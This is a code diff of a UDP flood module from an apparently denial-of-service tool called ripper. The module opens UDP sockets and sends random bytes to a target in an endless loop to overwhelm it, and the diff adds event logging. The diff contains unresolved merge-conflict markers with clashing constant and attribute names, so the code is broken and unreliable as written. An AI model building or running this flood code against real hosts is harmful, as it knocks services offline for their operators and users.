+++ ripper/actions/udp_flood.py
@@ -3,7 +3,11 @@ from socket import socket
 from typing import Any
 
 from ripper.common import generate_random_bytes
+<<<<<<< HEAD
 from ripper.errors import *
+=======
+from ripper.context.events_journal import EventsJournal
+>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
 from ripper.context.target import Target
 from ripper.constants import *
 from ripper.actions.attack_method import AttackMethod
@@ -11,6 +15,8 @@ from ripper.proxy import Proxy
 
 # Forward Reference
 Context = 'Context'
+
+Events = EventsJournal()
 
 
 # TODO add support for SOCKS5 proxy if proxy supports associate request
@@ -42,13 +48,14 @@ class UdpFlood(AttackMethod):
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as udp_conn:
             self._target.stats.connect.status_success()
+            Events.info('Creating new UDP connection...')
             while self.sendto(udp_conn):
                 if self._ctx.dry_run:
                     break
                 continue
 
             self._target.stats.connect.status_failed()
-            self._ctx.sock_manager.close_socket()
+            # self._ctx.sock_manager.close_socket()
 
     def sendto(self, sock: socket) -> bool:
         send_bytes = generate_random_bytes(
@@ -57,12 +64,21 @@ class UdpFlood(AttackMethod):
         try:
             sent = sock.sendto(send_bytes, self._target.hostip_port_tuple())
         except socket.gaierror as e:
+<<<<<<< HEAD
             self._target.errors_manager.add_error(UdpSendError(message=GETTING_SERVER_IP_ERR_MSG))
         except Exception as e:
             self._target.errors_manager.add_error(UdpSendError(message=e))
         else:
             self._target.stats.packets.status_sent(sent_bytes=sent)
             self._ctx.remove_error(UdpSendError(message=GETTING_SERVER_IP_ERR_MSG).uuid)
+=======
+            Events.exception(e)
+            Events.error(GETTING_SERVER_IP_ERROR_MSG)
+        except Exception as e:
+            Events.exception(e)
+        else:
+            self._ctx.target.statistic.packets.status_sent(sent_bytes=sent)
+>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
             return True
 
         return False